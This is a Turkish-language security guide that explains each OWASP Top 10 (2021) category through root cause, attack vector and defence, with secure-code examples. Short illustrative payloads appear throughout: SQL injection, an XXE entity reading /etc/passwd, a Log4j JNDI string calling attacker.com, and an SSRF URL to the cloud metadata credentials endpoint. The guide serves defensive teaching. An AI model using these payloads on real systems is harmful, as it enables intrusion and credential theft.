<div align="center">

<img src="https://capsule-render.vercel.app/render?type=waving&color=gradient&height=280&section=header&text=OWASP%20TOP%2010%20SUPREME%20DOCTRINE&fontSize=38&animation=fadeIn&fontColor=ffffff&desc=Atomik%20Analiz,%20Kök%20Nedenler%20ve%20Mutlak%20Savunma&descFontSize=18&gradient=800080,FF00FF" />

<br>

<img src="https://img.shields.io/badge/STANDART-OWASP_2021-blue?style=for-the-badge&logo=owasp" />
<img src="https://img.shields.io/badge/SEVİYE-SENIOR_ARCHITECT-red?style=for-the-badge&logo=hackthebox" />
<img src="https://img.shields.io/badge/İÇERİK-DERİN_ANALİZ-black?style=for-the-badge&logo=book" />
<img src="https://img.shields.io/badge/DİL-TÜRKÇE-success?style=for-the-badge&logo=turkey" />

</div>

<br>

> **"Bir zafiyeti anlamak için, o zafiyeti yaratan geliştiricinin zihnindeki varsayımı bulmalısınız. Güvenlik açığı kodda değil, 'Bunu kimse denemez' diyen o yanlış varsayımdadır."**

---

## 🧭 NAVİGASYON

| [A01: Access Control](#a01) | [A02: Cryptography](#a02) | [A03: Injection](#a03) | [A04: Design](#a04) | [A05: Config](#a05) |
| :---: | :---: | :---: | :---: | :---: |
| [A06: Components](#a06) | [A07: Identification](#a07) | [A08: Integrity](#a08) | [A09: Logging](#a09) | [A10: SSRF](#a10) |

---

<div id="a01"></div>

## 🔥 A01:2021 – Broken Access Control (Kırık Erişim Kontrolü)

Bu, modern web uygulamalarının **1 numaralı** katilidir.

### 🧬 1. Kök Neden (Atomik Analiz)
Yazılımcılar genellikle "Kimlik Doğrulama" (Authentication - Sen kimsin?) ile "Yetkilendirme" (Authorization - Bunu yapabilir misin?) kavramlarını karıştırır.
* **Hata:** Sistem, kullanıcının sisteme girmesine izin verir (Login başarılı), ancak kullanıcının *belirli bir veriye* erişip erişemeyeceğini, her istekte tekrar kontrol etmez.
* **Mekanizma:** Sunucu, yetki kontrolünü sunucu tarafındaki güvenli oturumda (Session) yapmak yerine, istemciden gelen güvensiz parametrelere (`id`, `role`, `hidden field`) güvenir.

### 💀 2. Saldırı Vektörü (IDOR - Insecure Direct Object Reference)
Saldırgan, URL'deki veya JSON gövdesindeki bir parametreyi değiştirerek başkasının verisine erişir.

* **Senaryo:**
    * Meşru İstek: `GET /api/fatura?id=1001` (Kendi faturam)
    * Saldırı: `GET /api/fatura?id=1002` (Başkasının faturası)
* **Sonuç:** Sunucu sadece "Giriş yapmış mı?" diye bakar, "Bu fatura bu kullanıcıya mı ait?" diye bakmazsa veri sızar.



### 🛡️ 3. Savunma Doktrini
* **Zorunlu Erişim Kontrolü:** Her bir veritabanı sorgusunda, sahiplik kontrolü yapılmalıdır.
    ```python
    # YANLIŞ
    fatura = db.query("SELECT * FROM invoices WHERE id = ?", input_id)
    
    # DOĞRU (Sahiplik Kontrolü)
    fatura = db.query("SELECT * FROM invoices WHERE id = ? AND owner_id = ?", input_id, current_user.id)
    ```
* **Tahmin Edilemez ID'ler:** Sıralı ID'ler (1001, 1002) yerine UUID (Universally Unique Identifier) kullanın.

---

<div id="a02"></div>

## 🔐 A02:2021 – Cryptographic Failures (Kriptografik Hatalar)

Hassas verilerin (PII, Kredi Kartı) korunmasındaki başarısızlık.

### 🧬 1. Kök Neden
Kriptografi matematiktir ve matematik hata kabul etmez. Geliştiriciler genellikle "Kendi şifreleme algoritmamı yazayım" yanılgısına düşer veya eski algoritmaları (Legacy) terk etmeye korkar.
* **Entropi Eksikliği:** Rastgele sayı üretecinin (PRNG) tahmin edilebilir olması.
* **Anahtar Yönetimi:** Şifreleme anahtarlarının kodun içine gömülmesi (Hardcoded Keys).

### 💀 2. Saldırı Vektörü
* **Padding Oracle Attack:** Şifreli metnin dolgusunu (padding) değiştirerek sunucunun verdiği hata mesajlarından açık metni çözmek.
* **Downgrade Attack:** Sunucuyu güçlü TLS 1.3 yerine güvensiz SSL v3 kullanmaya zorlayıp aradaki trafiği dinlemek (POODLE).

### 🛡️ 3. Savunma Doktrini
* **Asla Kendi kriptonuzu yazmayın:** Standart kütüphaneleri (Libsodium, OpenSSL) kullanın.
* **Algoritmalar:**
    * Hashing için: Argon2id veya bcrypt (ASLA MD5 veya SHA1 kullanma).
    * Şifreleme için: AES-256-GCM.
* **Veri Aktarımı:** Sadece HTTPS (HSTS Preload listesine dahil olun).

---

<div id="a03"></div>

## 💉 A03:2021 – Injection (Enjeksiyon)

Veri ile kodun birbirine karıştığı o ölümcül an.

### 🧬 1. Kök Neden
Bir uygulamanın "Ayrıştırıcısı" (Parser), geliştiricinin yazdığı komut ile kullanıcının girdiği veriyi ayırt edemediğinde oluşur.
* **Bağlam Karışıklığı:** Veritabanı motoru, `DROP TABLE` komutunun kullanıcıdan gelen bir "isim" değil, çalıştırılması gereken bir emir olduğunu sanır.

### 💀 2. Saldırı Vektörü (SQL Injection)
* **Senaryo:** Giriş paneli.
    * Kod: `SELECT * FROM users WHERE user = '` + `input_user` + `'`
    * Saldırı Girdisi: `admin' --`
    * Oluşan Sorgu: `SELECT * FROM users WHERE user = 'admin' --'`
* **Sonuç:** `--` işareti SQL'de yorum satırıdır. Sorgunun geri kalanı (şifre kontrolü) iptal edilir. Saldırgan şifresiz giriş yapar.



### 🛡️ 3. Savunma Doktrini
* **Prepared Statements (Parametreli Sorgular):** Tek ve kesin çözümdür. Sorgu yapısı veriden önce derlenir.
    ```java
    // DOĞRU
    String query = "SELECT * FROM users WHERE user = ?";
    PreparedStatement pstmt = connection.prepareStatement(query);
    pstmt.setString(1, input_user); // Girdi ne olursa olsun sadece 'veri' olarak işlenir.
    ```
* **ORM Kullanımı:** Entity Framework, Hibernate gibi modern ORM'ler enjeksiyonu otomatik engeller.

---

<div id="a04"></div>

## 🏗️ A04:2021 – Insecure Design (Güvensiz Tasarım)

Bu bir "Bug" (Hata) değil, "Flaw" (Kusur) sorunudur. Kod mükemmel yazılsa bile tasarım hatalı olabilir.

### 🧬 1. Kök Neden
Güvenlik gereksinimlerinin yazılım geliştirme döngüsünün (SDLC) başında belirlenmemesi.
* **Örnek:** "Kupon kodu sınırsız denenebilir mi?" sorusunun tasarım aşamasında sorulmaması.

### 💀 2. Saldırı Vektörü (İş Mantığı Suistimali)
* **Bot Saldırıları:** Bir e-ticaret sitesinde "Hediye Kartı" bakiyesini sorgulayan bir endpoint'te hız sınırı (Rate Limit) yoksa, saldırgan milyonlarca kombinasyonu deneyerek dolu kartları bulabilir.
* **Race Condition:** Aynı anda iki pencereden "Para Çek" butonuna basarak, veritabanı bakiyeyi düşmeden iki kez para çekmek.

### 🛡️ 3. Savunma Doktrini
* **Tehdit Modelleme (Threat Modeling):** Kod yazmadan önce "Bu sisteme nasıl saldırılabilir?" sorusunu sorun.
* **Rate Limiting:** Her API ucuna hız sınırı koyun.
* **CAPTCHA:** Otomasyonu engellemek için kritik işlemlere doğrulama koyun.

---

<div id="a05"></div>

## ⚙️ A05:2021 – Security Misconfiguration (Yanlış Yapılandırma)

Sistemin kendisi güvenli olsa bile, ayarlarının güvensiz olması.

### 🧬 1. Kök Neden
Varsayılan ayarların değiştirilmemesi ve "Çalışıyorsa dokunma" mantığı.
* **Gereksiz Bilgi:** Hata mesajlarının (Stack Trace) açık bırakılması.
* **Varsayılan Hesaplar:** Tomcat, Jenkins gibi panellerde `admin:password` bırakılması.

### 💀 2. Saldırı Vektörü (XXE - XML External Entity)
Uygulama XML kabul ediyorsa ve XML parser yanlış yapılandırılmışsa:
* **Payload:**
    ```xml
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <user>&xxe;</user>
    ```
* **Sonuç:** Sunucu `/etc/passwd` dosyasını okur ve saldırgana döndürür.

### 🛡️ 3. Savunma Doktrini
* **Hardening (Sıkılaştırma):** Kullanılmayan tüm portları, servisleri ve özellikleri kapatın.
* **Hata Yönetimi:** Kullanıcıya asla teknik hata mesajı göstermeyin. Sadece "Bir hata oluştu" deyin, detayı loglayın.
* **XXE Koruması:** Tüm XML parserlarında `external entities` özelliğini devre dışı bırakın.

---

<div id="a06"></div>

## 📦 A06:2021 – Vulnerable and Outdated Components (Savunmasız Bileşenler)

Tedarik zinciri (Supply Chain) güvenliği.

### 🧬 1. Kök Neden
Modern uygulamalar %80 oranında hazır kütüphane (Open Source) kullanır. Geliştiriciler bu kütüphaneleri güncellemekten korkar (Bozulma riski).
* **Transitive Dependency:** Sizin kullandığınız kütüphanenin kullandığı kütüphanede açık olması.

### 💀 2. Saldırı Vektörü (Log4j Örneği)
Java'nın en popüler loglama kütüphanesi Log4j'deki bir açık, internetin yarısını ele geçirdi.
* **Saldırı:** Saldırgan User-Agent başlığına `${jndi:ldap://attacker.com/malware}` yazar. Sunucu bunu loglarken kodu çalıştırır ve hacklenir.

### 🛡️ 3. Savunma Doktrini
* **SBOM (Software Bill of Materials):** Kullandığınız tüm bileşenlerin envanterini tutun.
* **SCA (Software Composition Analysis):** `OWASP Dependency Check` veya `Snyk` gibi araçlarla, projenizdeki kütüphaneleri bilinen CVE veritabanlarıyla sürekli tarayın.

---

<div id="a07"></div>

## 🆔 A07:2021 – Identification and Authentication Failures (Kimlik Doğrulama)

Dijital kimliğin çalınması veya taklit edilmesi.

### 🧬 1. Kök Neden
Oturum (Session) yönetiminin zayıf olması ve parola politikalarının yetersizliği.
* **Session ID Entropisi:** Oturum kimliklerinin tahmin edilebilir olması (örn: SessID=100, SessID=101).

### 💀 2. Saldırı Vektörü (Credential Stuffing)
Kullanıcılar her yerde aynı şifreyi kullanır. Saldırgan, bir siteden çaldığı veritabanını (Email/Şifre), sizin sitenizde dener.
* **Session Fixation:** Saldırgan kurbana kendi belirlediği bir Session ID içeren link gönderir (`site.com/?PHPSESSID=hacker_id`). Kurban giriş yapınca oturum saldırgana geçer.

### 🛡️ 3. Savunma Doktrini
* **MFA (Çok Faktörlü Doğrulama):** Zorunlu kılın. Şifre çalınsa bile hesap korunur.
* **Oturum Yönetimi:**
    * Giriş yapıldığında eski Session ID'yi yok et ve yenisini ver.
    * Oturum zaman aşımı (Timeout) koyun.
    * Çerezlere `HttpOnly`, `Secure` ve `SameSite` bayraklarını ekleyin.

---

<div id="a08"></div>

## 🛡️ A08:2021 – Software and Data Integrity Failures (Bütünlük Hataları)

Verinin veya kodun kaynağına güvenme hatası.

### 🧬 1. Kök Neden
Uygulamanın, güvenilmeyen kaynaklardan gelen güncellemeleri, kütüphaneleri veya nesneleri (objects) doğrulama yapmadan kabul etmesi.

### 💀 2. Saldırı Vektörü (Insecure Deserialization)
Serileştirme (Serialization), bir nesneyi (örn: User objesi) saklamak için byte dizisine çevirmektir. Deserialization ise bunu geri çevirmektir.
* **Saldırı:** Saldırgan, serileştirilmiş veriyi (Cookie vb.) değiştirerek içine zararlı bir komut ekler. Sunucu bu veriyi nesneye çevirirken (Deserialize) kodu çalıştırır (RCE).



### 🛡️ 3. Savunma Doktrini
* **İmzalama:** Serileştirilmiş veriyi dijital olarak imzalayın (HMAC) ve açmadan önce imzayı kontrol edin.
* **CI/CD Güvenliği:** Kod dağıtım boru hattınızın (Pipeline) güvenliğini sağlayın. Kodun production'a giderken değiştirilmediğinden emin olun.

---

<div id="a09"></div>

## 👁️ A09:2021 – Security Logging and Monitoring Failures (Körlük)

Bir saldırı olduğunda bunu fark edememek.

### 🧬 1. Kök Neden
Logların yetersiz olması, sadece "hataların" loglanması ama "güvenlik olaylarının" (başarısız girişler, yetki hataları) loglanmaması.
* **Kritik Hata:** Logların saldırganın erişebileceği yerel diskte tutulması.

### 💀 2. Saldırı Vektörü
Saldırganlar sistemde aylarca kalabilir (APT - Advanced Persistent Threat). Eğer sistem "1 dakikada 500 kez veritabanı hatası" oluştuğunda alarm vermiyorsa, saldırgan veritabanını sömürene kadar kimse fark etmez.

### 🛡️ 3. Savunma Doktrini
* **Ne Loglanmalı?** Başarısız girişler, erişim engellemeleri, girdi doğrulama hataları.
* **Merkezi Loglama:** Logları sunucudan anında uzak bir sunucuya (SIEM) taşıyın.
* **Alarm:** Kritik olaylarda (örn: Admin girişi) SOC ekibine gerçek zamanlı uyarı gönderin.

---

<div id="a10"></div>

## ☁️ A10:2021 – Server-Side Request Forgery (SSRF)

Sunucuyu bir vekil (proxy) gibi kullanarak iç ağa saldırmak.

### 🧬 1. Kök Neden
Uygulamanın, kullanıcının verdiği bir URL'den veri çekmesi (örn: "Resmi URL'den yükle") ancak bu URL'in nereye gittiğini doğrulamaması.

### 💀 2. Saldırı Vektörü (Cloud Metadata Saldırısı)
Modern bulut sistemlerinde (AWS, Azure, GCP), sunucular kimlik bilgilerini özel bir IP adresinden çeker.
* **Payload:** `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
* **Sonuç:** Saldırgan profil resmi yükleme alanına bu URL'i girer. Sunucu bu adrese gider, AWS anahtarlarını (Access Keys) çeker ve saldırgana gösterir. Saldırgan tüm bulut hesabını ele geçirir.



### 🛡️ 3. Savunma Doktrini
* **Ağ Ayrımı:** Web sunucularının iç ağdaki hassas kaynaklara erişmesini Firewall ile engelleyin.
* **Allowlist:** Sadece izin verilen alan adlarına (örn: `*.google.com`, `*.imgur.com`) istek atılmasına izin verin.
* **Yanıt Doğrulama:** Sunucunun döndürdüğü yanıtı kullanıcıya göstermeyin.

---

### 🏁 SONUÇ: PROFESYONEL BAKIŞ AÇISI

> **"OWASP Top 10 bir hedef değil, bir başlangıç noktasıdır. Gerçek güvenlik, listenin bittiği yerde başlar. Savunma, sürekli bir paranoya ve bitmeyen bir öğrenme sürecidir."**

---
**Durum:** `SUPREME_DOCTRINE_READY`
**Revizyon:** 3.0 (Masterclass)
**Yazar:** Kıdemli Güvenlik Mimarı